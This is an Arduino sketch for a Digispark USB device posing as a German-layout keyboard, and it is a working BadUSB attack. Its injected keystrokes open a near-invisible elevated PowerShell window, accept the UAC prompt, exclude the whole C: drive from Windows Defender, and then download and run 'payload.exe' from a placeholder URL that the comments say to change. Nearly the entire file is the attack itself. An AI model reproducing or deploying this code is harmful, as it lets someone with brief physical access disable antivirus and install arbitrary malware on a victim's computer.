// using the German-DigiKeyboard library (https://github.com/Phoenixthrush/DigistumpArduinoDe)
#include <DigiKeyboardDe.h>

// the setup routine runs once
void setup() {
  DigiKeyboard.update();
  
  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A

  // opening run box
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

  // opening powershell as admin
  DigiKeyboard.delay(300);
  DigiKeyboardDe.print("powershell -noexit -c \"[console]::windowwidth=1; [console]::windowheight=1\"");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);

  // accepting UAC
  DigiKeyboard.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_J, MOD_ALT_LEFT); // change KEY_J to KEY_Y on an english keyboard

  // waiting for powershell
  DigiKeyboard.delay(500);

  // creating exclusion for C drive via powershell
  DigiKeyboardDe.println("Add-MpPreference -ExclusionPath \"C:\\\"");

  // downloading and executing payload (change download link)
  DigiKeyboardDe.println("$down = New-Object System.Net.WebClient");
  DigiKeyboardDe.println("$url = 'http://127.0.0.1/payload.exe'");
  DigiKeyboardDe.println("$file = 'payload.exe'");
  DigiKeyboardDe.println("$down.DownloadFile($url,$file)");
  DigiKeyboardDe.println("$exec = New-Object -com shell.application; $exec.shellexecute($file); exit");
}

// the loop routine runs over and over again forever:
void loop() {
  digitalWrite(0, HIGH);  // turn the LED on (HIGH is the voltage level)
  digitalWrite(1, HIGH);
  delay(100);             // wait for a second
  digitalWrite(0, LOW);   // turn the LED off by making the voltage LOW
  digitalWrite(1, LOW); 
  delay(100);             // wait for a second
}
